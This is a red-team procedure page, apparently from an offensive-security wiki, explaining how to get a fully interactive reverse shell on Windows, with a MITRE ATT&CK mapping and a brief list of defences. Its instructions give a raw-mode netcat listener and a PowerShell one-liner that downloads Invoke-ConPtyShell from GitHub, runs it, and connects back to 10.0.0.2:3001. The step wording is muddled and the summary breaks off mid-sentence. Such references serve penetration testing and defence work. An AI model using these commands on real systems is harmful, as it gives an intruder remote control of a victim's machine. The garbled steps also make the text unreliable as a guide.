---
id: d138db42-e923-41fa-9734-342ec9a6dad3
name: Windows Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:25.082292+00:00'
updated_at: '2023-04-10T20:25:27.729751+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[Fully interactive reverse shell on Windows]]'
- '[[Reverse Shell Cheat Sheet]]'
commands:
- '[[Invoke-ConPtyShell]]'
- '[[Start Netcat listener on port 3001]]'
---

# Windows Reverse Shell

## Summary

A Windows reverse shell is a technique used by attackers to gain remote access to a compromised machine. This technique involves the attacker establishing a connection from the victim machine to an attacker-controlled machine, allowing them to execute commands and interact with the system as if the

## Description

# Description

A Windows reverse shell is a technique used by attackers to gain remote access to a compromised machine. This technique involves the attacker establishing a connection from the victim machine to an attacker-controlled machine, allowing them to execute commands and interact with the system as if they were physically present. This cheat sheet provides instructions on how to establish a fully interactive reverse shell on a Windows machine.

From a technical perspective, a reverse shell involves the attacker setting up a listener on a machine they control, and then executing a payload on the victim machine that connects back to the attacker's listener. The payload can be delivered through a variety of means, including email, social engineering, or exploiting vulnerabilities in software running on the victim machine.

The business value of this technique is that it allows attackers to gain full control over a compromised machine, giving them access to sensitive data and allowing them to execute further attacks.

## Requirements

1. Authentication credentials for the victim machine

1. Network access to the victim machine

1. A listener set up on an attacker-controlled machine

## Defense

1. Use network segmentation to limit the ability of attackers to move laterally within a network

1. Implement strong access controls, including multi-factor authentication and least privilege

1. Monitor network traffic for signs of malicious activity, including connections to known malicious IP addresses

## Objectives

1. Establish a fully interactive reverse shell on a Windows machine

1. Gain remote access to a compromised machine

1. Execute commands and interact with the system as if physically present

# Instructions

1. To access a remote terminal, run this command on the remote host and connect to it from the local host using netcat or any other similar tool.

This command sets up a raw terminal and listens on port 3001 for incoming connections. Once a connection is established, it sends the terminal size to the client and starts streaming the input to the terminal. This allows for remote access and control of the terminal on the remote host.

**Command** ([[Start Netcat listener on port 3001]]):

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

2. To establish a remote shell access, run the above command on the client side.

This command will download and execute a PowerShell script from GitHub which will establish a reverse shell connection to the IP address 10.0.0.2 on port 3001. The remote shell access can be used to execute commands on the target machine and gain access to its resources.

**Command** ([[Invoke-ConPtyShell]]):

```bash
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Commands Used

- [[Invoke-ConPtyShell]]
- [[Start Netcat listener on port 3001]]

## Tags

- [[Fully interactive reverse shell on Windows]]
- [[Reverse Shell Cheat Sheet]]
